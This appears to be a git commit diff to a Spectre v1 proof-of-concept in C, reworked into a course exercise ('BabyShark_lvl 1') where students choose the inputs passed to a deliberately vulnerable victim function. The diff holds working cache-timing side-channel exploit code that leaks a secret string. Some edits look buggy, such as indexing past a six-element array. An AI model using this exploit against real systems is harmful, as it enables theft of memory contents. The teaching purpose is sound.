97f90414d876dca3b714c03ed6c44f331c271d86
Jacob Urick <jacoburick01@gmail.com>
2023-04-20 11:38:28 -0400

    Update BabyGhost.c

--- BabyGhost.c
+++ BabyGhost.c
@@ -38,23 +38,22 @@ char * secret = "The Magic Words are Sqeamish Ossifraggee";
 uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
 
 void victim_function(size_t x, size_t y, size_t z) {
-  if ((z & y & ~x)) {
+  if (((z + y) > array1_size & ~x)) {
     temp &= array2[array1[x] * 512];
   }
 }
-
 #define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
 
 /* Report best guess in value[0] and runner-up in value[1] */
 void readMemoryByte(size_t inputs[6], uint8_t value[2], int score[2]) {
   static int results[256];
   int tries, i, j, k, mix_i, junk = 0;
-  size_t training_x, malicious_x, x;
+  size_t training_x, x;
   register uint64_t time1, time2;
   volatile uint8_t * addr;
   int cpui[4];
 
-  malicious_x = inputs[0];
+  training_x = inputs[5];
   for (i = 0; i < 256; i++)
     results[i] = 0;
   for (tries = 999; tries > 0; tries--) {
@@ -64,20 +63,23 @@ void readMemoryByte(size_t inputs[6], uint8_t value[2], int score[2]) {
       _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */
 
     /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
-    training_x = tries % array1_size;
-    for (j = 29; j >= 0; j--) {
-        x = inputs[j % 6];
+	size_t malicious_x = inputs[0];    
+    for (j = 30; j > 0; j--) {
+      x = inputs[j];
       _mm_clflush( & array1_size);
       for (volatile int z = 0; z < 500; z++) {} /* Delay (can also mfence) */
 
       /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
       /* Avoid jumps in case those tip off the branch predictor */
+
+      /* Call the victim! */
        x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
        x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
        x = training_x ^ (x & (malicious_x ^ training_x));
 
       /* Call the victim! */
-      victim_function(x, inputs[1], inputs[2]);
+     // printf("Args: %d %d %d\n", x, inputs[1], inputs[3]);
+      victim_function(x, inputs[1], inputs[3]);
 
     }
 
@@ -126,11 +128,12 @@ int main(int argc,
   int i, score[2], len = 40;
   uint8_t value[2];
   size_t x[6] = {0, 0, 0, 0, 0, 0};
+  char* output = malloc(41);
   size_t input_var;
-
   printf("Welcome to BabyShark_lvl 1\n");
   printf("In these series of assignments, you will be exploring the Spectre Vulnerability\n");
-  printf("Here, you will choose the values that are passed to the vulnerable  function\n");
+  printf("Here, you will choose the values that are passed to the vulnerable function\n");
+
   printf("Enter the first value to be passed to the vulnerable function\n");
   scanf("%zu", &input_var);
   x[1] = input_var;
@@ -147,27 +150,22 @@ printf("Enter the fifth value to be passed to the vulnerable function\n");
   scanf("%zu", &input_var);  
   x[5] = input_var; 
 
+
   for (i = 0; i < sizeof(array2); i++)
     array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
 
   x[0] = malicious_x;
-  if (argc == 3) {
-    sscanf(argv[1], "%p", (void * * )( & malicious_x));
-    malicious_x -= (size_t) array1; /* Convert input value into a pointer */
-    sscanf(argv[2], "%d", & len);
-  }
 
   printf("Reading %d bytes:\n", len);
+  int str_index = 0;
   while (--len >= 0) {
-    printf("Reading at malicious_x = %p... ", (void * ) malicious_x);
     readMemoryByte(x, value, score);
-    x[0] += 1;
-    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
-    printf("0x%02X=’%c’ score=%d ", value[0],
-      (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
-    if (score[1] > 0)
-      printf("(second best: 0x%02X score=%d)", value[1], score[1]);
-    printf("\n");
+    x[0] = x[0] + 1;
+    printf("%c", value[0] > 31 && value[0] < 127 ? value[0] : '?');
+
   }
+
+
   return (0);
 }
+
